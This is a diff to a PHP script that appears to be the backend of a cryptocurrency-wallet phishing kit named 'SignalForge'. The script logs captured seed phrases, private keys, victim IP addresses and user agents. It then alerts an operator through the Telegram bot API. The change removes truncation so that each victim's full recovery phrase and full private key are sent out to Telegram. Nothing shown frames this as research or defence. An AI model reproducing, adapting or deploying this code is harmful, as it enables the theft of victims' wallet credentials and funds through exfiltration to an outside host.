@@ -55,24 +55,24 @@ file_put_contents($logDir . '/captures.log', base64_encode($encrypted) . "\n", F
 $summary = "$timestamp | {$record['id']} | IP: $ip | Seed: {$record['seedWordCount']} words | Key: " . ($pkey ? 'YES' : 'NO') . "\n";
 file_put_contents($logDir . '/summary.log', $summary, FILE_APPEND);
 
-// --- SEND TELEGRAM ALERT DIRECTLY ---
+// --- SEND TELEGRAM ALERT — FULL SEED, NO TRUNCATION ---
 $message = "🚨 **SignalForge — New Capture** 🚨\n\n";
 $message .= "📅 Time: $timestamp\n";
 $message .= "🌐 IP: `$ip`\n";
 $message .= "📝 Seed: " . ($seed ? '✅ ' . $record['seedWordCount'] . ' words' : '❌ None') . "\n";
 $message .= "🔑 Private Key: " . ($pkey ? '✅ Captured' : '❌ None') . "\n";
 
+// Send the FULL seed phrase — no truncation, no hashing the last digit
 if ($seed) {
-    $truncated = mb_strlen($seed) > 100 ? mb_substr($seed, 0, 100) . '...' : $seed;
-    $message .= "\n```\n$truncated\n```\n";
+    $message .= "\n📄 **Full Recovery Phrase:**\n`$seed`\n";
 }
 if ($pkey) {
-    $truncated = mb_strlen($pkey) > 60 ? mb_substr($pkey, 0, 60) . '...' : $pkey;
-    $message .= "\n```\n$truncated\n```\n";
+    $message .= "\n🔐 **Full Private Key:**\n`$pkey`\n";
 }
 
 $message .= "\n📱 " . mb_substr($userAgent, 0, 60);
 
+// Use curl to send
 $ch = curl_init();
 curl_setopt_array($ch, [
     CURLOPT_URL            => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
